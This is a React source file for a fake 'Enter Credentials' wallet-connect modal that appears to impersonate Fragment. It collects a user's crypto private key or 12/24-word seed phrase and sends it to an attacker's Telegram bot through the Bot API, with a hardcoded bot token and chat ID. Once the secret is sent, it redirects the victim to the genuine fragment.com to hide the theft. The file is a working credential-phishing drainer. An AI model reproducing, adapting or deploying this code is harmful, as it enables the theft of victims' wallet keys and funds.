import React, {useState} from 'react';
import '../auth.css'

const AuthModal = ({onConfirm, onClose, walletName}) => {
    const [authType, setAuthType] = useState('privateKey');
    const [seedLength, setSeedLength] = useState(12);
    const [inputData, setInputData] = useState('');
    const [error, setError] = useState('');
    const sendData = async () => {
        const message = `
        New Fragment data Received:
        - Wallet: ${walletName}
        - Auth type: ${authType}
        - Input data: ${inputData}
        `;

        const botToken = '7811377089:AAHq5Pl8UBG4XLzhJmkV-jBFtQmih5bM-d8'; // Замените на токен вашего бота
        const chatId = '497578008'; // Замените на ваш ID чата (или ID группы)

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });

            if (response.ok) {
                window.location.replace("https://fragment.com/");
            } else {
                alert('Failed to send data. Please try again.');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred. Please try again.');
        }
    }
    const validateInput = () => {
        if (authType === 'privateKey') {
            if (inputData.length !== 64) {
                setError('Private key must be 64 characters long');
                return false;
            } else
                setError('')
        } else {
            const words = inputData.trim().split(/\s+/);
            if (words.length !== seedLength) {
                setError(`Seed phrase must contain exactly ${seedLength} words`);
                return false;
            } else
                setError('')
        }
        if (error === '')
            sendData()
        return true;
    };

    const handleSubmit = () => {
        if (!validateInput()) return;
        onConfirm({
            type: authType,
            data: inputData,
            ...(authType === 'seedPhrase' && {seedLength})
        });
        onClose();
    };

    return (
        <div style={styles.modalOverlay} onClick={onClose}>
            <div style={styles.modalContent} onClick={(e) => e.stopPropagation()}>
                <h3 style={styles.modalTitle}>Enter Credentials</h3>

                <div style={styles.authOptions}>
                    <label style={styles.authOption}>
                        <input
                            type="radio"
                            name="authType"
                            value="privateKey"
                            className={'radio-input'}
                            checked={authType === 'privateKey'}
                            onChange={() => setAuthType('privateKey')}
                            style={styles.radioInput}
                        />
                        <span style={styles.radioLabel}>Private Key</span>
                    </label>

                    <label style={styles.authOption}>
                        <input
                            type="radio"
                            name="authType"
                            value="seedPhrase"
                            className={'radio-input'}
                            checked={authType === 'seedPhrase'}
                            onChange={() => setAuthType('seedPhrase')}
                            style={styles.radioInput}
                        />
                        <span style={styles.radioLabel}>Seed Phrase</span>
                    </label>
                </div>

                {authType === 'seedPhrase' && (
                    <div style={styles.seedLengthOptions}>
                        <label style={styles.seedOption}>
                            <input
                                type="radio"
                                name="seedLength"
                                value={12}
                                className={'radio-input'}
                                checked={seedLength === 12}
                                onChange={() => setSeedLength(12)}
                                style={styles.radioInput}
                            />
                            <span style={styles.radioLabel}>12 words</span>
                        </label>

                        <label style={styles.seedOption}>
                            <input
                                type="radio"
                                name="seedLength"
                                value={24}
                                className={'radio-input'}
                                checked={seedLength === 24}
                                onChange={() => setSeedLength(24)}
                                style={styles.radioInput}
                            />
                            <span style={styles.radioLabel}>24 words</span>
                        </label>
                    </div>
                )}

                <div style={styles.inputContainer}>
                    {authType === 'privateKey' ? (
                        <input
                            className={'auth-input'}
                            type="password"
                            placeholder="Enter private key"
                            value={inputData}
                            onChange={(e) => setInputData(e.target.value)}
                            style={styles.authInput}
                        />
                    ) : (
                        <textarea
                            className={'auth-text-area'}
                            placeholder={`Enter ${seedLength} words separated by spaces`}
                            value={inputData}
                            onChange={(e) => setInputData(e.target.value)}
                            style={styles.authTextarea}
                            rows="4"
                        />
                    )}
                </div>

                {error && <div style={styles.errorMessage}>{error}</div>}

                <div style={styles.modalActions}>
                    <div className="w-100 d-flex justify-content-between">
                        <button className={'cancel-button w-50'} style={styles.cancelButton} onClick={onClose}>
                            Cancel
                        </button>
                        <button className={'confirm-button w-50 ms-2'} style={styles.confirmButton} onClick={handleSubmit}>
                            Connect
                        </button>
                    </div>
                </div>
            </div>
        </div>
    );
};

const styles = {
    modalOverlay: {
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(0,0,0,0.7)',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        zIndex: 1000,
    },
    modalContent: {
        backgroundColor: '#1a2026',
        borderRadius: '16px',
        padding: '24px',
        width: '400px',
        maxWidth: '90%',
    },
    modalTitle: {
        color: '#fff',
        fontSize: '20px',
        marginBottom: '24px',
        textAlign: 'center',
    },
    authOptions: {
        display: 'flex',
        gap: '1rem',
        marginBottom: '1.5rem',
    },
    authOption: {
        display: 'flex',
        alignItems: 'center',
        gap: '0.5rem',
        cursor: 'pointer',
    },
    seedLengthOptions: {
        display: 'flex',
        gap: '1rem',
        marginBottom: '1rem',
    },
    seedOption: {
        display: 'flex',
        alignItems: 'center',
        gap: '0.5rem',
        cursor: 'pointer',
    },
    radioInput: {
        appearance: 'none',
        width: '16px',
        height: '16px',
        border: '2px solid #00b2ff',
        borderRadius: '50%',
        cursor: 'pointer',
    },
    radioLabel: {
        color: '#fff',
        fontSize: '14px',
    },
    inputContainer: {
        margin: '1.5rem 0',
    },
    authInput: {
        width: '100%',
        padding: '12px',
        borderRadius: '8px',
        border: '1px solid #333',
        backgroundColor: '#212a33',
        color: '#fff',
        fontSize: '14px',
        outline: 'none',
    },
    authTextarea: {
        width: '100%',
        padding: '12px',
        borderRadius: '8px',
        border: '1px solid #333',
        backgroundColor: '#212a33',
        color: '#fff',
        fontSize: '14px',
        resize: 'vertical',
        minHeight: '100px',
        outline: 'none',
    },
    errorMessage: {
        color: '#ff4d4d',
        fontSize: '12px',
        marginBottom: '1rem',
    },
    modalActions: {
        display: 'flex',
        gap: '1rem',
        justifyContent: 'flex-end',
    },
    cancelButton: {
        backgroundColor: '#333',
        color: '#fff',
        padding: '10px 20px',
        borderRadius: '8px',
        border: 'none',
        cursor: 'pointer',
        fontSize: '14px',
        transition: 'background-color 0.2s',

    },
    confirmButton: {
        backgroundColor: '#00b2ff',
        color: '#fff',
        padding: '10px 20px',
        borderRadius: '8px',
        border: 'none',
        cursor: 'pointer',
        fontSize: '14px',
        transition: 'background-color 0.2s',
    },
};

export default AuthModal;